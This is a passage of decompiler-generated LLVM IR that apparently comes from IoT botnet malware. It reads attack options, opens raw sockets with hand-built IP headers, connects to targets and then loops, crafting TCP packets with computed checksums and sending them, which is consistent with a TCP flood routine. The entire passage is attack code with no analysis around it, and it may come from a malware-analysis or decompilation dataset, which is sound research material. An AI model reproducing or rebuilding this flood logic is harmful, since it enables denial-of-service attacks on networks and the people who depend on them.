  %v0_b478 = load i32, i32* @r7, align 4
  store i32 %v0_b478, i32* %r3.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r0.global-to-local, align 4
  %v3_b480 = urem i32 %v6_b468, 65536
  store i32 %v3_b480, i32* @sb, align 4
  %v4_b484 = inttoptr i32 %v0_b46c to i32*
  %v5_b484 = call i32 @attack_get_opt_int(i32 %v0_b47c, i32* %v4_b484, i32 10, i32 %v0_b478)
  %v1_b48c = urem i32 %v5_b484, 256
  store i32 %v1_b48c, i32* %ip.global-to-local, align 4
  %v0_b490 = load i32, i32* @r4, align 4
  store i32 %v0_b490, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v5_b4a4 = inttoptr i32 %v0_b490 to i32*
  %v6_b4a4 = call i32 @attack_get_opt_int(i32 %v0_b49c, i32* %v5_b4a4, i32 11, i32 1)
  %v1_b4ac = urem i32 %v6_b4a4, 256
  store i32 %v1_b4ac, i32* %ip.global-to-local, align 4
  %v0_b4b0 = load i32, i32* @r4, align 4
  store i32 %v0_b4b0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4bc = load i32, i32* @r5, align 4
  store i32 %v0_b4bc, i32* %r0.global-to-local, align 4
  %v5_b4c4 = inttoptr i32 %v0_b4b0 to i32*
  %v6_b4c4 = call i32 @attack_get_opt_int(i32 %v0_b4bc, i32* %v5_b4c4, i32 12, i32 1)
  %v1_b4cc = urem i32 %v6_b4c4, 256
  store i32 %v1_b4cc, i32* %ip.global-to-local, align 4
  %v0_b4d0 = load i32, i32* @r4, align 4
  store i32 %v0_b4d0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_b4d8 = load i32, i32* @r7, align 4
  store i32 %v0_b4d8, i32* %r3.global-to-local, align 4
  %v0_b4dc = load i32, i32* @r5, align 4
  store i32 %v0_b4dc, i32* %r0.global-to-local, align 4
  %v5_b4e4 = inttoptr i32 %v0_b4d0 to i32*
  %v6_b4e4 = call i32 @attack_get_opt_int(i32 %v0_b4dc, i32* %v5_b4e4, i32 13, i32 %v0_b4d8)
  %v1_b4ec = urem i32 %v6_b4e4, 256
  store i32 %v1_b4ec, i32* %ip.global-to-local, align 4
  %v0_b4f0 = load i32, i32* @r4, align 4
  store i32 %v0_b4f0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_b4f8 = load i32, i32* @r7, align 4
  store i32 %v0_b4f8, i32* %r3.global-to-local, align 4
  %v0_b4fc = load i32, i32* @r5, align 4
  store i32 %v0_b4fc, i32* %r0.global-to-local, align 4
  %v5_b504 = inttoptr i32 %v0_b4f0 to i32*
  %v6_b504 = call i32 @attack_get_opt_int(i32 %v0_b4fc, i32* %v5_b504, i32 14, i32 %v0_b4f8)
  %v1_b50c = urem i32 %v6_b504, 256
  store i32 %v1_b50c, i32* %ip.global-to-local, align 4
  %v0_b510 = load i32, i32* @r4, align 4
  store i32 %v0_b510, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_b518 = load i32, i32* @r7, align 4
  store i32 %v0_b518, i32* %r3.global-to-local, align 4
  %v0_b51c = load i32, i32* @r5, align 4
  store i32 %v0_b51c, i32* %r0.global-to-local, align 4
  %v5_b524 = inttoptr i32 %v0_b510 to i32*
  %v6_b524 = call i32 @attack_get_opt_int(i32 %v0_b51c, i32* %v5_b524, i32 15, i32 %v0_b518)
  %v1_b52c = urem i32 %v6_b524, 256
  store i32 %v1_b52c, i32* %ip.global-to-local, align 4
  %v0_b530 = load i32, i32* @r7, align 4
  store i32 %v0_b530, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b538 = load i32, i32* @r4, align 4
  store i32 %v0_b538, i32* %r1.global-to-local, align 4
  %v0_b53c = load i32, i32* @r5, align 4
  store i32 %v0_b53c, i32* %r0.global-to-local, align 4
  %v5_b544 = inttoptr i32 %v0_b538 to i32*
  %v6_b544 = call i32 @attack_get_opt_int(i32 %v0_b53c, i32* %v5_b544, i32 %v0_b530, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b550 = load i32, i32* @r4, align 4
  store i32 %v0_b550, i32* %r1.global-to-local, align 4
  %v0_b558 = load i32, i32* @r5, align 4
  store i32 %v0_b558, i32* %r0.global-to-local, align 4
  %v4_b55c = inttoptr i32 %v0_b550 to i32*
  %v5_b55c = call i32 @attack_get_opt_int(i32 %v0_b558, i32* %v4_b55c, i32 1, i32 1)
  %v1_b564 = urem i32 %v5_b55c, 256
  store i32 %v1_b564, i32* %r3.global-to-local, align 4
  %v0_b568 = load i32, i32* @r7, align 4
  store i32 %v0_b568, i32* %r0.global-to-local, align 4
  %v1_b570 = inttoptr i32 %v0_b568 to i32*
  %v2_b570 = call i32 @__GI_time(i32* %v1_b570)
  %v1_b574 = load i32, i32* @r6, align 4
  %v2_b574 = add i32 %v1_b574, %v2_b570
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b588 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b588, i32* %r0.global-to-local, align 4
  %v7_b58c = icmp eq i32 %v3_b588, -1
  store i32 %v3_b588, i32* @sl, align 4
  br i1 %v7_b58c, label %dec_label_pc_b8cc, label %dec_label_pc_b598

dec_label_pc_b598:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b5a0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b5a0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b5a8 = load i32, i32* @r7, align 4
  store i32 %v0_b5a8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b5b4 = call i32 @__GI_setsockopt(i32 %v3_b588, i32 %v0_b5a8, i32 3, i32 %v6_b5a0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b5b4, i32* %r0.global-to-local, align 4
  %v7_b5b8 = icmp eq i32 %v5_b5b4, -1
  br i1 %v7_b5b8, label %dec_label_pc_b8c4, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b598
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_b5c4 = load i32, i32* @r8, align 4
  %v3_b5c8 = urem i32 %v0_b5c4, 65536
  store i32 %v3_b5c8, i32* @r3, align 4
  %v2_b5cc = icmp eq i32 %arg2, 0
  %v0_b5d0 = load i32, i32* @r7, align 4
  store i32 %v0_b5d0, i32* %stack_var_-44, align 4
  %v5_b5d4 = trunc i32 %v0_b5c4 to i16
  br i1 %v2_b5cc, label %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge, label %dec_label_pc_b5dc.preheader

dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge: ; preds = %dec_label_pc_b5c0
  %.pre = sext i16 %v5_b5d4 to i32
  %.pre94 = add i32 %v6_b544, 40
  br label %dec_label_pc_b768.preheader

dec_label_pc_b5dc.preheader:                      ; preds = %dec_label_pc_b5c0
  %v2_b620 = ptrtoint i32* %stack_var_-160 to i32
  %v2_b668 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b680 = ptrtoint i32* %stack_var_-80 to i32
  %v2_b688 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b68c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b714 = zext i8 %tmp32 to i32
  %v1_b718 = and i32 %v4_b714, 18
  %v2_b71c = icmp eq i32 %v1_b718, 18
  %v1_b9cc = add i32 %v6_b544, 40
  %v4_ba0c = sext i16 %v5_b5d4 to i32
  %v3_ba18 = udiv i32 %v4_ba0c, 256
  %v1_baf4 = urem i32 %v5_b484, 2
  %tmp95 = sub nsw i32 0, %v1_baf4
  %v4_bafc = and i32 %tmp95, 32
  %v1_bb28 = urem i32 %v6_b4c4, 2
  %tmp96 = sub nsw i32 0, %v1_bb28
  %v4_bb30 = and i32 %tmp96, 8
  %v1_bb74 = urem i32 %v6_b524, 2
  %v3_b700 = sext i16 %tmp62 to i32
  %v1_b724 = and i32 %v4_b714, 5
  %v2_b724 = icmp eq i32 %v1_b724, 0
  %v4_b660 = add i32 %v2_b620, 98
  %v5_b660 = inttoptr i32 %v4_b660 to i16*
  %v1_ba14 = mul nsw i32 %v4_ba0c, 256
  %v4_ba24 = and i32 %v1_ba14, 65280
  %v5_ba24 = or i32 %v4_ba24, %v3_ba18
  %v1_bb0c = urem i32 %v6_b4a4, 2
  %tmp97 = sub nsw i32 0, %v1_bb0c
  %v4_bb14 = and i32 %tmp97, 16
  %v1_bb40 = urem i32 %v6_b4e4, 2
  %tmp98 = sub nsw i32 0, %v1_bb40
  %v4_bb48 = and i32 %tmp98, 4
  %v1_bb58 = urem i32 %v6_b504, 2
  %tmp99 = sub nsw i32 0, %v1_bb58
  %v3_bb60 = and i32 %tmp99, 2
  br label %dec_label_pc_b5dc.outer

dec_label_pc_b5dc.outer:                          ; preds = %dec_label_pc_b5dc.preheader, %.thread10
  %stack_var_-340.0.ph = phi i32 [ %tmp, %dec_label_pc_b5dc.preheader ], [ %v0_ba58, %.thread10 ]
  %stack_var_-62.0.ph = phi i16 [ %tmp33, %dec_label_pc_b5dc.preheader ], [ %stack_var_-62.2, %.thread10 ]
  %stack_var_-60.0.ph = phi i32 [ %tmp36, %dec_label_pc_b5dc.preheader ], [ %v0_b970, %.thread10 ]
  br label %dec_label_pc_b5dc

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5dc.outer, %dec_label_pc_b750
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b750 ], [ %stack_var_-62.0.ph, %dec_label_pc_b5dc.outer ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b750 ], [ %stack_var_-60.0.ph, %dec_label_pc_b5dc.outer ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b5e8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b5e8, i32* %r0.global-to-local, align 4
  %v7_b5ec = icmp eq i32 %v3_b5e8, -1
  store i32 %v3_b5e8, i32* @r8, align 4
  br i1 %v7_b5ec, label %dec_label_pc_b750, label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5dc, %dec_label_pc_b72c
  %v0_b600 = phi i32 [ %v3_b740, %dec_label_pc_b72c ], [ %v3_b5e8, %dec_label_pc_b5dc ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b72c ], [ %stack_var_-62.0, %dec_label_pc_b5dc ]
  %stack_var_-60.1 = phi i32 [ %v0_b970, %dec_label_pc_b72c ], [ %stack_var_-60.0, %dec_label_pc_b5dc ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b600 = call i32 @__libc_fcntl(i32 %v0_b600, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b608 = or i32 %v2_b600, 2048
  store i32 %v1_b608, i32* @r2, align 4
  %v0_b60c = load i32, i32* @r8, align 4
  store i32 %v0_b60c, i32* %r0.global-to-local, align 4
  %v2_b610 = call i32 @__libc_fcntl(i32 %v0_b60c, i32 4)
  store i32 %v2_b610, i32* %r0.global-to-local, align 4
  %v3_b614 = load i32, i32* %stack_var_-44, align 4
  %v5_b61c = mul i32 %v3_b614, 24
  store i32 %v2_b620, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v1_b62c = load i32, i32* @fp, align 4
  %v2_b62c = add i32 %v1_b62c, %v5_b61c
  store i32 %v2_b62c, i32* %r3.global-to-local, align 4
  %v1_b630 = add i32 %v2_b62c, 20
  %v2_b630 = inttoptr i32 %v1_b630 to i8*
  %v3_b630 = load i8, i8* %v2_b630, align 1
  %v4_b630 = zext i8 %v3_b630 to i32
  store i32 %v4_b630, i32* %r2.global-to-local, align 4
  %v2_b634 = icmp ugt i8 %v3_b630, 30
  %v7_b634 = icmp eq i8 %v3_b630, 31
  %v2_b638 = xor i1 %v7_b634, true
  %v3_b638 = and i1 %v2_b634, %v2_b638
  br i1 %v3_b638, label %bb, label %bb72

bb:                                               ; preds = %dec_label_pc_b5f8
  %v5_b638 = add i32 %v2_b62c, 16
  %v6_b638 = inttoptr i32 %v5_b638 to i32*
  %v7_b638 = load i32, i32* %v6_b638, align 4
  store i32 %v7_b638, i32* %r3.global-to-local, align 4
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_b5f8, %bb
  %v4_b63c = phi i32 [ %v2_b62c, %dec_label_pc_b5f8 ], [ %v7_b638, %bb ]
  %v4_b63c.stack_var_-60.1 = select i1 %v3_b638, i32 %v4_b63c, i32 %stack_var_-60.1
  %v2_b640 = xor i1 %v2_b634, true
  %v3_b640 = or i1 %v7_b634, %v2_b640
  br i1 %v3_b640, label %dec_label_pc_b8d8, label %dec_label_pc_b644

dec_label_pc_b644:                                ; preds = %bb72, %dec_label_pc_b8d8
  %v0_b970 = phi i32 [ %v5_b924, %dec_label_pc_b8d8 ], [ %v4_b63c.stack_var_-60.1, %bb72 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b64c = load i32, i32* @sb, align 4
  %v9_b64c = icmp eq i32 %v0_b64c, 65535
  br i1 %v9_b64c, label %dec_label_pc_b930, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_b644
  %v4_b650 = udiv i32 %v0_b64c, 256
  %v2_b654 = urem i32 %v0_b64c, 256
  store i32 %v2_b654, i32* %r2.global-to-local, align 4
  %v5_b658 = mul nuw nsw i32 %v2_b654, 256
  %v6_b658 = or i32 %v5_b658, %v4_b650
  store i32 %v6_b658, i32* %r3.global-to-local, align 4
  store i32 %v2_b620, i32* %ip.global-to-local, align 4
  %v2_b660 = trunc i32 %v6_b658 to i16
  store i16 %v2_b660, i16* %v5_b660, align 2
  br label %dec_label_pc_b668

dec_label_pc_b668:                                ; preds = %.thread7, %dec_label_pc_b930
  %stack_var_-62.2 = phi i16 [ %v1_b930, %dec_label_pc_b930 ], [ %stack_var_-62.1, %.thread7 ]
  store i32 %v2_b668, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b670 = load i32, i32* @r8, align 4
  store i32 %v0_b670, i32* %r0.global-to-local, align 4
  %v3_b674 = call i32 @__libc_connect(i32 %v0_b670, i32 %v2_b668, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b67c = call i32 @__GI_time(i32* null)
  store i32 %v2_b67c, i32* %r0.global-to-local, align 4
  store i32 %v2_b680, i32* @r7, align 4
  store i32 %v2_b67c, i32* @r4, align 4
  store i32 %v2_b688, i32* @r6, align 4
  store i32 %v2_b68c, i32* @r5, align 4
  %v9_b6e0 = icmp eq i32 %tmp34, %v0_b970
  %v4_b708 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b6e0 to i32
  %v9_b6f4 = icmp eq i1 %v9_b6e0, false
  %v9_b70c = icmp eq i32 %v3_b700, %v4_b708
  br label %dec_label_pc_b6a4

dec_label_pc_b694:                                ; preds = %.thread, %dec_label_pc_b6fc, %dec_label_pc_b724, %bb76
  %v2_b694 = call i32 @__GI_time(i32* null)
  %v0_b698 = load i32, i32* @r4, align 4
  %v2_b698 = sub i32 %v2_b694, %v0_b698
  store i32 %v2_b698, i32* %r0.global-to-local, align 4
  %v8_b6a0 = icmp sgt i32 %v2_b698, 10
  br i1 %v8_b6a0, label %dec_label_pc_b72c, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b694, %dec_label_pc_b668
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 %v2_b688, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b6b4 = load i32, i32* @sl, align 4
  store i32 %v0_b6b4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_b6c4 = call i32 @__libc_recvfrom(i32 %v0_b6b4, i32 %v2_b688, i32 256, i32 16384, i32 %v2_b680, i32 %v2_b68c)
  store i32 %v6_b6c4, i32* %r2.global-to-local, align 4
  %v7_b6cc = icmp eq i32 %v6_b6c4, -1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b6cc, label %dec_label_pc_b8cc, label %dec_label_pc_b6d8

dec_label_pc_b6d8:                                ; preds = %dec_label_pc_b6a4
  store i32 %v0_b970, i32* @r1, align 4
  store i32 %tmp34, i32* @r3, align 4
  store i32 %., i32* @lr, align 4
  %tmp100 = icmp ult i32 %v6_b6c4, 41
  br i1 %tmp100, label %.thread, label %bb76

.thread:                                          ; preds = %dec_label_pc_b6d8
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_b694

bb76:                                             ; preds = %dec_label_pc_b6d8
  br i1 %v9_b6f4, label %dec_label_pc_b694, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %bb76
  store i32 %v3_b700, i32* @lr, align 4
  store i32 %v2_b620, i32* @r3, align 4
  store i32 %v4_b708, i32* %r2.global-to-local, align 4
  br i1 %v9_b70c, label %dec_label_pc_b714, label %dec_label_pc_b694

dec_label_pc_b714:                                ; preds = %dec_label_pc_b6fc
  store i32 %v4_b714, i32* %r2.global-to-local, align 4
  store i32 %v1_b718, i32* @r3, align 4
  br i1 %v2_b71c, label %dec_label_pc_b964, label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b714
  br i1 %v2_b724, label %dec_label_pc_b694, label %dec_label_pc_b72c

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b694
  %v0_b72c = load i32, i32* @r8, align 4
  store i32 %v0_b72c, i32* %r0.global-to-local, align 4
  %v1_b730 = call i32 @__GI___libc_close(i32 %v0_b72c)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b740 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b740, i32* %r0.global-to-local, align 4
  %v3_b744 = icmp eq i32 %v3_b740, -1
  store i32 %v3_b740, i32* @r8, align 4
  br i1 %v3_b744, label %dec_label_pc_b750, label %dec_label_pc_b5f8

dec_label_pc_b750:                                ; preds = %dec_label_pc_b72c, %dec_label_pc_b5dc
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b5dc ], [ %stack_var_-62.2, %dec_label_pc_b72c ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b5dc ], [ %v0_b970, %dec_label_pc_b72c ]
  %v3_b750 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_b758 = add i32 %v3_b750, 1
  store i32 %v1_b758, i32* @r3, align 4
  store i32 %v1_b758, i32* %stack_var_-44, align 4
  %v5_b764 = icmp slt i32 %v1_b758, %arg2
  br i1 %v5_b764, label %dec_label_pc_b5dc, label %dec_label_pc_b768.preheader

dec_label_pc_b768.preheader:                      ; preds = %.thread10, %dec_label_pc_b750, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge
  %v1_b7a0.pre-phi = phi i32 [ %.pre94, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge ], [ %v1_b9cc, %dec_label_pc_b750 ], [ %v1_b9cc, %.thread10 ]
  %v4_b884.pre-phi = phi i32 [ %.pre, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge ], [ %v4_ba0c, %dec_label_pc_b750 ], [ %v4_ba0c, %.thread10 ]
  %v3_b780 = mul i32 %v6_b544, 65536
  %v1_b784 = add i32 %v3_b780, 1310720
  %tmp78 = udiv i32 %v1_b784, 256
  %v3_b790 = and i32 %tmp78, 65280
  %v2_b89c = icmp eq i32 %v1_b564, 0
  %v4_b794 = udiv i32 %v1_b784, 16777216
  %v5_b794 = or i32 %v3_b790, %v4_b794
  %v1_b79c = add i32 %v6_b544, 20
  br label %dec_label_pc_b768

dec_label_pc_b768:                                ; preds = %dec_label_pc_b768.preheader, %dec_label_pc_b94c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b5cc, label %dec_label_pc_b94c, label %dec_label_pc_b77c

dec_label_pc_b77c:                                ; preds = %dec_label_pc_b768
  store i32 %v1_b784, i32* %r2.global-to-local, align 4
  store i32 %v6_b544, i32* %ip.global-to-local, align 4
  store i32 %v3_b790, i32* %r3.global-to-local, align 4
  store i32 %v5_b794, i32* @sb, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_b79c, i32* @r8, align 4
  store i32 %v1_b7a0.pre-phi, i32* @r7, align 4
  br label %dec_label_pc_b898

dec_label_pc_b7a8:                                ; preds = %dec_label_pc_b898, %dec_label_pc_b8a4
  %v2_b7ac = phi i32 [ %v7_b880, %dec_label_pc_b898 ], [ %v2_b7ac.pre, %dec_label_pc_b8a4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b7ac = add i32 %v2_b7ac, 10
  %v4_b7ac = inttoptr i32 %v3_b7ac to i16*
  store i16 0, i16* %v4_b7ac, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b7b4 = load i32, i32* @r5, align 4
  store i32 %v0_b7b4, i32* @r0, align 4
  %v2_b7b8 = call i32 @checksum_generic(i32 %v0_b7b4, i32 20)
  %v3_b7b8 = trunc i32 %v2_b7b8 to i16
  store i32 %v2_b7b8, i32* %r0.global-to-local, align 4
  %v3_b7bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b3c0, i32* %ip.global-to-local, align 4
  %v3_b7c4 = mul i32 %v3_b7bc, 16
  %v2_b7c8 = add i32 %v3_b7c4, %v2_b3c0
  store i32 %v2_b7c8, i32* %r1.global-to-local, align 4
  %v1_b7cc = add i32 %v2_b7c8, 4
  %v2_b7cc = inttoptr i32 %v1_b7cc to i32*
  %v3_b7cc = load i32, i32* %v2_b7cc, align 4
  %v3_b7d0 = mul i32 %v3_b7cc, 65536
  store i32 %v3_b7d0, i32* %ip.global-to-local, align 4
  %tmp79 = mul i32 %v3_b7cc, 256
  %v1_b7d8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v3_b7cc, 256
  %v4_b7dc = urem i32 %tmp80, 256
  %v5_b7dc = or i32 %v4_b7dc, %v1_b7d8
  store i32 %v5_b7dc, i32* %r3.global-to-local, align 4
  %v1_b7e0 = add i32 %v3_b7cc, 1
  store i32 %v1_b7e0, i32* %r2.global-to-local, align 4
  store i32 %v1_b7e0, i32* %v2_b7cc, align 4
  %v0_b7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7e8 = load i32, i32* @r6, align 4
  %v2_b7e8 = add i32 %v1_b7e8, 4
  %v3_b7e8 = inttoptr i32 %v2_b7e8 to i32*
  store i32 %v0_b7e8, i32* %v3_b7e8, align 4
  %v0_b7ec = load i32, i32* %r1.global-to-local, align 4
  %v1_b7ec = add i32 %v0_b7ec, 8
  %v2_b7ec = inttoptr i32 %v1_b7ec to i32*
  %v3_b7ec = load i32, i32* %v2_b7ec, align 4
  %tmp81 = mul i32 %v3_b7ec, 256
  %v1_b7f8 = and i32 %tmp81, 65280
  %tmp82 = udiv i32 %v3_b7ec, 256
  %v4_b7fc = urem i32 %tmp82, 256
  %v5_b7fc = or i32 %v4_b7fc, %v1_b7f8
  store i32 %v5_b7fc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v3_b804 = load i32, i32* @r5, align 4
  %v4_b804 = add i32 %v3_b804, 10
  %v5_b804 = inttoptr i32 %v4_b804 to i16*
  store i16 %v3_b7b8, i16* %v5_b804, align 2
  %v0_b808 = load i32, i32* %r3.global-to-local, align 4
  %v1_b808 = load i32, i32* @r6, align 4
  %v2_b808 = add i32 %v1_b808, 8
  %v3_b808 = inttoptr i32 %v2_b808 to i32*
  store i32 %v0_b808, i32* %v3_b808, align 4
  %v0_b80c = load i32, i32* @lr, align 4
  %v1_b80c = trunc i32 %v0_b80c to i16
  %v2_b80c = load i32, i32* @r6, align 4
  %v3_b80c = add i32 %v2_b80c, 16
  %v4_b80c = inttoptr i32 %v3_b80c to i16*
  store i16 %v1_b80c, i16* %v4_b80c, align 2
  %v0_b810 = load i32, i32* @r6, align 4
  store i32 %v0_b810, i32* @r1, align 4
  %v0_b814 = load i32, i32* @sb, align 4
  store i32 %v0_b814, i32* %r2.global-to-local, align 4
  %v0_b818 = load i32, i32* @r8, align 4
  store i32 %v0_b818, i32* %r3.global-to-local, align 4
  %v0_b81c = load i32, i32* @r5, align 4
  store i32 %v0_b81c, i32* %r0.global-to-local, align 4
  %v4_b820 = call i32 @checksum_tcpudp(i32 %v0_b81c, i32 %v0_b810, i32 %v0_b814, i32 %v0_b818)
  %v5_b820 = trunc i32 %v4_b820 to i16
  store i32 %v4_b820, i32* %r0.global-to-local, align 4
  %v3_b824 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b824, i32* %r3.global-to-local, align 4
  %v3_b828 = mul i32 %v3_b824, 32
  store i32 %v3_b828, i32* %lr.global-to-local, align 4
  %v3_b82c = load i32, i32* @r6, align 4
  %v4_b82c = add i32 %v3_b82c, 16
  %v5_b82c = inttoptr i32 %v4_b82c to i16*
  store i16 %v5_b820, i16* %v5_b82c, align 2
  %v0_b830 = load i32, i32* %lr.global-to-local, align 4
  %v1_b830 = load i32, i32* %r3.global-to-local, align 4
  %tmp101 = mul i32 %v1_b830, -8
  %v5_b830 = add i32 %v0_b830, %tmp101
  store i32 %v5_b830, i32* %lr.global-to-local, align 4
  %v0_b834 = load i32, i32* @r6, align 4
  %v1_b834 = add i32 %v0_b834, 2
  %v2_b834 = inttoptr i32 %v1_b834 to i16*
  %v3_b834 = load i16, i16* %v2_b834, align 2
  %v4_b834 = zext i16 %v3_b834 to i32
  store i32 %v4_b834, i32* @r6, align 4
  %v1_b838 = load i32, i32* @fp, align 4
  %v2_b838 = add i32 %v1_b838, %v5_b830
  store i32 %v2_b838, i32* @lr, align 4
  %v3_b83c = add i32 %v2_b838, 2
  %v4_b83c = inttoptr i32 %v3_b83c to i16*
  store i16 %v3_b834, i16* %v4_b83c, align 2
  %v0_b840 = load i32, i32* @r5, align 4
  store i32 %v0_b840, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  store i32 %v0_b84c, i32* %r0.global-to-local, align 4
  %v0_b850 = load i32, i32* @r7, align 4
  store i32 %v0_b850, i32* %r2.global-to-local, align 4
  %v0_b854 = load i32, i32* @lr, align 4
  %v6_b85c = call i32 @__libc_sendto(i32 %v0_b84c, i32 %v0_b840, i32 %v0_b850, i32 16384, i32 %v0_b854, i32 16)
  %v3_b860 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b860, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v1_b868 = add i32 %v3_b860, 1
  store i32 %v1_b868, i32* %r0.global-to-local, align 4
  store i32 %v1_b868, i32* %stack_var_-44, align 4
  %v7_b874 = icmp slt i32 %v1_b868, %arg2
  br i1 %v7_b874, label %dec_label_pc_b898, label %dec_label_pc_b94c

dec_label_pc_b898:                                ; preds = %dec_label_pc_b77c, %dec_label_pc_b7a8
  %v1_b880 = phi i32 [ %v1_b868, %dec_label_pc_b7a8 ], [ 0, %dec_label_pc_b77c ]
  store i32 %v2_b3d0, i32* @lr, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v4_b880, %v2_b3d0
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r5, align 4
  store i32 %v4_b884.pre-phi, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_b890 = add i32 %v7_b880, 20
  store i32 %v1_b890, i32* @r6, align 4
  store i32 %v1_b564, i32* %r1.global-to-local, align 4
  br i1 %v2_b89c, label %dec_label_pc_b7a8, label %dec_label_pc_b8a4

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b898
  %v1_b8a4 = add i32 %v7_b880, 40
  store i32 %v1_b8a4, i32* @r4, align 4
  store i32 %v1_b8a4, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %r1.global-to-local, align 4
  %v2_b8b0 = call i32 @rand_alphastr(i32 %v1_b8a4, i32 %v6_b544)
  store i32 %v2_b8b0, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b8bc = load i32, i32* @r4, align 4
  %v4_b8bc = add i32 %v2_b8bc, %v6_b544
  %v5_b8bc = inttoptr i32 %v4_b8bc to i8*
  store i8 0, i8* %v5_b8bc, align 1
  %v2_b7ac.pre = load i32, i32* @r5, align 4
